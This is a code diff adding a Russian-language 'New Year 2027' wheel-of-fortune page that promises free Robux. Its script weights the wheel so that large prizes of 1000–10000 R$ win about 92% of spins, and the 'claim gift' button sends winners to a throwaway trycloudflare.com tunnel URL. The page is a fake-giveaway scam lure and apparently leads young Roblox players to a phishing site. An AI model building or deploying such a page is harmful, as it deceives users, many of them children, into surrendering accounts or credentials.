@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Новогоднее Колесо Фортуны 2027 — Розыгрыш Robux</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600;800;900&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at top, #1b3b2b 0%, #091510 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Падающий снег */
+        #snow-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            padding: 20px;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .badge-2027 {
+            display: inline-block;
+            background: linear-gradient(45deg, #d42426, #ff4b4d);
+            padding: 6px 18px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(212, 36, 38, 0.5);
+            margin-bottom: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 900;
+            margin-bottom: 8px;
+            text-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+            background: linear-gradient(to bottom, #ffffff, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p.subtitle {
+            font-size: 15px;
+            color: #cbd5e1;
+            margin-bottom: 30px;
+        }
+
+        /* Контейнер колеса */
+        .wheel-wrapper {
+            position: relative;
+            width: 340px;
+            height: 340px;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Золотой обод с лампочками */
+        .wheel-border {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ffd700, #b8860b, #ffd700);
+            box-shadow: 0 0 35px rgba(255, 215, 0, 0.4), inset 0 0 15px rgba(0, 0, 0, 0.5);
+            padding: 12px;
+        }
+
+        canvas#wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            display: block;
+            transition: transform 5s cubic-bezier(0.15, 0.85, 0.15, 1);
+        }
+
+        /* Указатель сверху */
+        .pointer {
+            position: absolute;
+            top: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 18px solid transparent;
+            border-right: 18px solid transparent;
+            border-top: 34px solid #ff2a2a;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.6));
+            z-index: 10;
+        }
+
+        .pointer::after {
+            content: '';
+            position: absolute;
+            top: -36px;
+            left: -6px;
+            width: 12px;
+            height: 12px;
+            background: #ffd700;
+            border-radius: 50%;
+        }
+
+        /* Центральная заглушка колеса */
+        .center-cap {
+            position: absolute;
+            width: 54px;
+            height: 54px;
+            background: radial-gradient(circle, #ffffff, #cbd5e1);
+            border: 4px solid #d42426;
+            border-radius: 50%;
+            z-index: 5;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: #d42426;
+            font-size: 18px;
+        }
+
+        /* Кнопка вращения */
+        .spin-btn {
+            background: linear-gradient(180deg, #ff3b3b 0%, #b80000 100%);
+            color: white;
+            border: 2px solid #ffd700;
+            padding: 16px 45px;
+            font-size: 18px;
+            font-weight: 800;
+            border-radius: 50px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 8px 25px rgba(212, 36, 38, 0.6);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .spin-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(255, 59, 59, 0.8);
+        }
+
+        .spin-btn:active:not(:disabled) {
+            transform: translateY(1px);
+        }
+
+        .spin-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Модальное окно выигрыша */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(6px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-box {
+            background: linear-gradient(145deg, #163325, #0d1f16);
+            border: 2px solid #ffd700;
+            border-radius: 24px;
+            padding: 35px 25px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
+            transform: scale(0.8);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .modal-overlay.active .modal-box {
+            transform: scale(1);
+        }
+
+        .modal-icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: #ffd700;
+            margin-bottom: 10px;
+        }
+
+        .modal-prize {
+            font-size: 32px;
+            font-weight: 900;
+            color: #ffffff;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 12px;
+            margin: 15px 0 25px;
+            border: 1px dashed #ffd700;
+        }
+
+        .claim-btn {
+            display: inline-block;
+            width: 100%;
+            background: linear-gradient(180deg, #22c55e 0%, #15803d 100%);
+            color: #ffffff;
+            text-decoration: none;
+            padding: 16px 20px;
+            font-size: 18px;
+            font-weight: 800;
+            border-radius: 14px;
+            border: 2px solid #86efac;
+            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.5);
+            transition: transform 0.2s, filter 0.2s;
+            text-transform: uppercase;
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+
+        @media (max-width: 400px) {
+            .wheel-wrapper {
+                width: 290px;
+                height: 290px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="snow-canvas"></canvas>
+
+    <div class="container">
+        <div class="badge-2027">🎄 С Новым 2027 Годом! 🎄</div>
+        <h1>НОВОГОДНИЙ РОЗЫГРЫШ</h1>
+        <p class="subtitle">Испытай удачу и забери праздничный бонус Robux!</p>
+
+        <div class="wheel-wrapper">
+            <div class="pointer"></div>
+            <div class="wheel-border">
+                <canvas id="wheel" width="400" height="400"></canvas>
+            </div>
+            <div class="center-cap">R$</div>
+        </div>
+
+        <button class="spin-btn" id="spinBtn">Крутить колесо</button>
+    </div>
+
+    <!-- Всплывающее окно с подарком -->
+    <div class="modal-overlay" id="winModal">
+        <div class="modal-box">
+            <div class="modal-icon">🎁</div>
+            <div class="modal-title">ПОЗДРАВЛЯЕМ!</div>
+            <p style="color: #cbd5e1; font-size: 14px;">Твой новогодний подарок на 2027 год:</p>
+            <div class="modal-prize" id="prizeText">0 ROBUX</div>
+            <a href="#" id="claimBtn" class="claim-btn">Забрать подарок</a>
+        </div>
+    </div>
+
+    <script>
+        const REDIRECT_URL = "https://written-sea-cos-fluid.trycloudflare.com";
+        document.getElementById('claimBtn').href = REDIRECT_URL;
+
+        const canvas = document.getElementById('wheel');
+        const ctx = canvas.getContext('2d');
+        const spinBtn = document.getElementById('spinBtn');
+        const winModal = document.getElementById('winModal');
+        const prizeText = document.getElementById('prizeText');
+
+        // 12 одинаковых секторов со строгим чередованием цветов: Красный -> Зеленый -> Красный...
+        const segments = [
+            { label: '1000 R$',  chance: 23, color: '#d42426' }, // 1. Красный
+            { label: '10 R$',       chance: 1,  color: '#14532d' }, // 2. Зеленый
+            { label: '3000 R$',  chance: 23, color: '#d42426' }, // 3. Красный
+            { label: '25 R$',       chance: 1,  color: '#14532d' }, // 4. Зеленый
+            { label: '5000 R$',  chance: 23, color: '#d42426' }, // 5. Красный
+            { label: '50 R$',       chance: 1,  color: '#14532d' }, // 6. Зеленый
+            { label: '10000 R$', chance: 23, color: '#d42426' }, // 7. Красный
+            { label: '75 R$',       chance: 1,  color: '#14532d' }, // 8. Зеленый
+            { label: '500 R$',       chance: 1,  color: '#d42426' }, // 9. Красный
+            { label: '60 R$',       chance: 1,  color: '#14532d' }, // 10. Зеленый
+            { label: '200 R$',       chance: 1,  color: '#d42426' }, // 11. Красный
+            { label: '100 R$',      chance: 1,  color: '#14532d' }  // 12. Зеленый
+        ];
+
+        const numSegments = segments.length;
+        const arcSize = (2 * Math.PI) / numSegments;
+        const totalChance = segments.reduce((sum, seg) => sum + seg.chance, 0);
+
+        let currentRotation = 0;
+        let isSpinning = false;
+
+        // Отрисовка колеса с идеальным выравниванием текста
+        function drawWheel() {
+            const centerX = canvas.width / 2;
+            const centerY = canvas.height / 2;
+            const radius = canvas.width / 2;
+
+            for (let i = 0; i < numSegments; i++) {
+                const startAngle = i * arcSize - Math.PI / 2;
+                const endAngle = startAngle + arcSize;
+
+                // Сектор
+                ctx.beginPath();
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+                ctx.closePath();
+                ctx.fillStyle = segments[i].color;
+                ctx.fill();
+
+                // Разделительная золотая линия
+                ctx.lineWidth = 2;
+                ctx.strokeStyle = '#ffd700';
+                ctx.stroke();
+
+                // Текст внутри сектора
+                ctx.save();
+                ctx.translate(centerX, centerY);
+                
+                // Вычисляем угол центра сектора в пределах от 0 до 2*PI
+                let angle = (startAngle + arcSize / 2) % (2 * Math.PI);
+                if (angle < 0) angle += 2 * Math.PI;
+
+                ctx.rotate(angle);
+                
+                // Если сектор смотрит в левую сторону полукруя (от 90 до 270 градусов), 
+                // переворачиваем текст, чтобы он никогда не был вверх ногами
+                if (angle > Math.PI / 2 && angle < 3 * Math.PI / 2) {
+                    ctx.rotate(Math.PI);
+                    ctx.textAlign = 'left';
+                    var textDistance = -(radius * 0.65);
+                } else {
+                    ctx.textAlign = 'right';
+                    var textDistance = radius * 0.65;
+                }
+
+                ctx.textBaseline = 'middle';
+                ctx.fillStyle = '#ffffff';
+                
+                const fontSize = segments[i].chance > 1 ? 13 : 11;
+                ctx.font = `900 ${fontSize}px Montserrat, sans-serif`;
+                ctx.shadowColor = 'rgba(0, 0, 0, 0.7)';
+                ctx.shadowBlur = 3;
+                
+                ctx.fillText(segments[i].label, textDistance, 0);
+                ctx.restore();
+            }
+        }
+
+        drawWheel();
+
+        // Логика выпадения по заданным шансам
+        function getRandomIndexByChance() {
+            const randomNum = Math.random() * totalChance;
+            let cumulative = 0;
+            for (let i = 0; i < segments.length; i++) {
+                cumulative += segments[i].chance;
+                if (randomNum < cumulative) {
+                    return i;
+                }
+            }
+            return 0;
+        }
+
+        // Логика вращения
+        spinBtn.addEventListener('click', () => {
+            if (isSpinning) return;
+            isSpinning = true;
+            spinBtn.disabled = true;
+
+            const winningIndex = getRandomIndexByChance();
+
+            const sliceDegrees = 360 / numSegments;
+            const randomOffset = Math.random() * (sliceDegrees - 8) + 4;
+            
+            const targetAngle = 360 - (winningIndex * sliceDegrees + randomOffset);
+            const extraSpins = 360 * 6;
+            const rotationMod = currentRotation % 360;
+            currentRotation += extraSpins + (targetAngle - rotationMod + 360) % 360;
+
+            canvas.style.transform = `rotate(${currentRotation}deg)`;
+
+            setTimeout(() => {
+                prizeText.textContent = segments[winningIndex].label;
+                winModal.classList.add('active');
+                isSpinning = false;
+            }, 5100);
+        });
+
+        // Анимация падающего снега
+        const snowCanvas = document.getElementById('snow-canvas');
+        const snowCtx = snowCanvas.getContext('2d');
+        let width = snowCanvas.width = window.innerWidth;
+        let height = snowCanvas.height = window.innerHeight;
+
+        window.addEventListener('resize', () => {
+            width = snowCanvas.width = window.innerWidth;
+            height = snowCanvas.height = window.innerHeight;
+        });
+
+        const snowflakes = Array.from({ length: 70 }, () => ({
+            x: Math.random() * width,
+            y: Math.random() * height,
+            r: Math.random() * 3 + 1,
+            speed: Math.random() * 1.5 + 0.5,
+            drift: Math.random() * 1 - 0.5
+        }));
+
+        function updateSnow() {
+            snowCtx.clearRect(0, 0, width, height);
+            snowCtx.fillStyle = 'rgba(255, 255, 255, 0.8)';
+            snowCtx.beginPath();
+
+            for (const flake of snowflakes) {
+                snowCtx.moveTo(flake.x, flake.y);
+                snowCtx.arc(flake.x, flake.y, flake.r, 0, Math.PI * 2);
+
+                flake.y += flake.speed;
+                flake.x += flake.drift;
+
+                if (flake.y > height) {
+                    flake.y = -5;
+                    flake.x = Math.random() * width;
+                }
+                if (flake.x > width) flake.x = 0;
+                if (flake.x < 0) flake.x = width;
+            }
+
+            snowCtx.fill();
+            requestAnimationFrame(updateSnow);
+        }
+
+        updateSnow();
+    </script>
+</body>
+</html>
